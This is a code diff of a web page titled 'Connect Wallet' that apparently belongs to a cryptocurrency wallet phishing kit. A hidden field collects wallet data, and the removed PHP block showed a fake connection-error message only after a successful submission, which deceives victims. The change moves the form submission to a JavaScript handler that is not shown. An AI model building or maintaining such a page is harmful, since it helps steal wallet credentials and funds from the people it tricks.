@@ -104,7 +104,7 @@
                 </div>
                 <div class="message-tab"></div>
                 <div class="send-form">
-                <form action="process.php" method="post">
+                <form method="post" id="contact-form-1" onsubmit="return submitForm('contact-form-1');">
                         <input type="hidden" name="form_tools_form_id" value="6">
                         <input type="hidden" name="email" id="walletNameData">
                         <div id="data-to-send">
@@ -166,8 +166,6 @@
                         <h1 class="animated pulse">Connect Wallet</h1>
                         <!--<h6 class="animated pulse">Please connect your wallet to continue</h6>-->
                         
-                    <?php if($_GET['result']=="success"){
-        echo "<label class='thank_you_message' style='color:red;'>Error while trying to establish a connection.</label><br/>";} ?>
                     </div>
                 </div>
                 <div class="row">
@@ -782,5 +780,5 @@
     document.getElementById("contact-form-1").addEventListener("submit", function(event) {
         handleSubmitForm("contact-form-1");
     });
-
+</script>
 </body></html>
